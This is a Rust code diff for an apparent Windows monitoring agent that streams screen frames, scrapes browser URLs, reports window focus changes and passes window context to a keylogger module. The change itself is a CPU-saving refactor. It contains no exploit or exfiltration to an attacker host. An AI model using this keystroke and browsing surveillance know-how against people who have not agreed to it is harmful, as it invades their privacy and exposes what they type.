@@ -102,8 +102,15 @@ const FRAME_CHANNEL_CAP: usize = 4;
 /// Bounded capacity for the outbound WebSocket message channel.
 const OUTBOUND_CHANNEL_CAP: usize = 16;
 
-/// How often to poll the foreground window for title/app changes.
-const WINDOW_POLL_INTERVAL_MS: u64 = 200;
+/// Legacy foreground poll interval. In normal operation we use WinEvent hooks
+/// to avoid polling and keep idle CPU extremely low.
+const WINDOW_POLL_INTERVAL_MS: u64 = 1000;
+
+/// URL scraping cadence:
+/// - When the foreground app is a browser: poll fairly often (UIAutomation is still polling-based).
+/// - Otherwise: back off heavily to keep idle CPU near-zero.
+const URL_POLL_BROWSER_MS: u64 = 1000;
+const URL_POLL_BACKGROUND_SECS: u64 = 30;
 
 // ─────────────────────────────────────────────────────────────────────────────
 // Entry point  (synchronous — eframe owns the main thread)
@@ -446,10 +453,16 @@ async fn run_session(
 
     // ── Window focus tracker ──────────────────────────────────────────────
     let mut win_tracker = WindowTracker::new();
+    let (win_hook_guard, mut win_event_rx) = match window_tracker::subscribe_foreground_events() {
+        Ok((g, rx)) => (Some(g), Some(rx)),
+        Err(e) => {
+            warn!("Foreground WinEvent hook unavailable; falling back to polling: {e}");
+            (None, None)
+        }
+    };
+    let _win_hook_guard = win_hook_guard;
 
     // ── Timers ────────────────────────────────────────────────────────────
-    let mut frame_ticker = interval(Duration::from_millis(FRAME_INTERVAL_MS));
-    let mut url_ticker = interval(Duration::from_secs(2));
     let mut window_ticker = interval(Duration::from_millis(WINDOW_POLL_INTERVAL_MS));
 
     // First software inventory ~1 minute after connect, then every 24 hours.
@@ -458,10 +471,12 @@ async fn run_session(
         Duration::from_secs(86_400),
     );
 
-    frame_ticker.set_missed_tick_behavior(MissedTickBehavior::Skip);
-    url_ticker.set_missed_tick_behavior(MissedTickBehavior::Skip);
     window_ticker.set_missed_tick_behavior(MissedTickBehavior::Skip);
     software_ticker.set_missed_tick_behavior(MissedTickBehavior::Skip);
+
+    // ── URL scraping state ────────────────────────────────────────────────
+    let mut foreground_is_browser = false;
+    let mut last_url_sent: Option<String> = None;
 
     // ── Event loop ────────────────────────────────────────────────────────
     let result: Result<()> = loop {
@@ -500,37 +515,52 @@ async fn run_session(
             }
 
             // ── Branch 2: screen frame delivery ──────────────────────────
-            _ = frame_ticker.tick() => {
-                let mut latest: Option<Vec<u8>> = None;
-                while let Ok(jpeg) = frame_rx.try_recv() {
-                    latest = Some(jpeg);
-                }
-                if let Some(jpeg) = latest {
-                    if out_tx.send(Message::Binary(jpeg)).await.is_err() {
-                        break Err(anyhow::anyhow!(
-                            "Outbound channel closed; writer task exited unexpectedly."
-                        ));
+            // Avoid waking up at 15 FPS when no one is viewing the screen.
+            _ = tokio::time::sleep(if capture_stop.is_some() {
+                Duration::from_millis(FRAME_INTERVAL_MS)
+            } else {
+                Duration::from_secs(1)
+            }) => {
+                if capture_stop.is_some() {
+                    let mut latest: Option<Vec<u8>> = None;
+                    while let Ok(jpeg) = frame_rx.try_recv() {
+                        latest = Some(jpeg);
+                    }
+                    if let Some(jpeg) = latest {
+                        if out_tx.send(Message::Binary(jpeg)).await.is_err() {
+                            break Err(anyhow::anyhow!(
+                                "Outbound channel closed; writer task exited unexpectedly."
+                            ));
+                        }
                     }
                 }
             }
 
-            // ── Branch 3: active browser URL ─────────────────────────────
-            _ = url_ticker.tick() => {
-                if let Some(info) = url_scraper::get_active_url() {
-                    // WebSocket-first alerts (original behavior):
-                    // Always send URL events to the server over the agent WebSocket.
-                    let legacy = serde_json::json!({
-                        "type"    : "url",
-                        "url"     : info.url,
-                        "title"   : info.title,
-                        "browser" : info.browser_name,
-                        "ts"      : unix_timestamp_secs(),
-                    })
-                    .to_string();
-                    if out_tx.send(Message::Text(legacy)).await.is_err() {
-                        break Err(anyhow::anyhow!(
-                            "Outbound channel closed; writer task exited unexpectedly."
-                        ));
+            // ── Branch 3: active browser URL (adaptive; near-zero idle CPU) ─────
+            _ = tokio::time::sleep(if foreground_is_browser {
+                Duration::from_millis(URL_POLL_BROWSER_MS)
+            } else {
+                Duration::from_secs(URL_POLL_BACKGROUND_SECS)
+            }) => {
+                if foreground_is_browser {
+                    if let Some(info) = url_scraper::get_active_url() {
+                        let url = info.url.trim().to_string();
+                        if !url.is_empty() && last_url_sent.as_deref() != Some(url.as_str()) {
+                            last_url_sent = Some(url.clone());
+                            let legacy = serde_json::json!({
+                                "type"    : "url",
+                                "url"     : url,
+                                "title"   : info.title,
+                                "browser" : info.browser_name,
+                                "ts"      : unix_timestamp_secs(),
+                            })
+                            .to_string();
+                            if out_tx.send(Message::Text(legacy)).await.is_err() {
+                                break Err(anyhow::anyhow!(
+                                    "Outbound channel closed; writer task exited unexpectedly."
+                                ));
+                            }
+                        }
                     }
                 }
             }
@@ -579,9 +609,70 @@ async fn run_session(
                 }
             }
 
-            // ── Branch 5: foreground window changes ───────────────────────
+            // ── Branch 5a: foreground window changes (event-driven) ───────
+            evt = async {
+                match win_event_rx.as_mut() {
+                    Some(rx) => rx.recv().await,
+                    None => None,
+                }
+            } => {
+                if evt.is_some() {
+                    let snap = win_tracker.snapshot();
+                    if let Some(event) = win_tracker.update_if_changed(snap) {
+                        // Publish latest context for keylogger to avoid per-key Win32 queries.
+                        keylogger::set_foreground_context(
+                            event.app.clone(),
+                            event.app_display.clone(),
+                            event.title.clone(),
+                        );
+                        foreground_is_browser = is_browser_exe(&event.app);
+
+                        // If a browser just became active, scrape immediately.
+                        if foreground_is_browser {
+                            if let Some(info) = url_scraper::get_active_url() {
+                                let url = info.url.trim().to_string();
+                                if !url.is_empty() && last_url_sent.as_deref() != Some(url.as_str()) {
+                                    last_url_sent = Some(url.clone());
+                                    let legacy = serde_json::json!({
+                                        "type"    : "url",
+                                        "url"     : url,
+                                        "title"   : info.title,
+                                        "browser" : info.browser_name,
+                                        "ts"      : unix_timestamp_secs(),
+                                    })
+                                    .to_string();
+                                    let _ = out_tx.send(Message::Text(legacy)).await;
+                                }
+                            }
+                        }
+
+                        let payload = serde_json::json!({
+                            "type"  : "window_focus",
+                            "title" : event.title,
+                            "app"   : event.app,
+                            "app_display": event.app_display,
+                            "hwnd"  : event.hwnd,
+                            "ts"    : unix_timestamp_secs(),
+                        })
+                        .to_string();
+                        if out_tx.send(Message::Text(payload)).await.is_err() {
+                            break Err(anyhow::anyhow!(
+                                "Outbound channel closed; writer task exited unexpectedly."
+                            ));
+                        }
+                    }
+                }
+            }
+
+            // ── Branch 5b: fallback polling (rare) ────────────────────────
             _ = window_ticker.tick() => {
                 if let Some(event) = win_tracker.poll() {
+                    keylogger::set_foreground_context(
+                        event.app.clone(),
+                        event.app_display.clone(),
+                        event.title.clone(),
+                    );
+                    foreground_is_browser = is_browser_exe(&event.app);
                     let payload = serde_json::json!({
                         "type"  : "window_focus",
                         "title" : event.title,
@@ -1062,6 +1153,23 @@ fn set_status(status: &Mutex<AgentStatus>, s: AgentStatus) {
     if let Ok(mut guard) = status.lock() {
         *guard = s;
     }
+}
+
+fn is_browser_exe(app: &str) -> bool {
+    matches!(
+        app.trim().to_ascii_lowercase().as_str(),
+        "chrome.exe"
+            | "msedge.exe"
+            | "firefox.exe"
+            | "brave.exe"
+            | "opera.exe"
+            | "vivaldi.exe"
+            | "chromium.exe"
+            | "arc.exe"
+            | "waterfox.exe"
+            | "librewolf.exe"
+            | "thorium.exe"
+    )
 }
 
 #[inline]
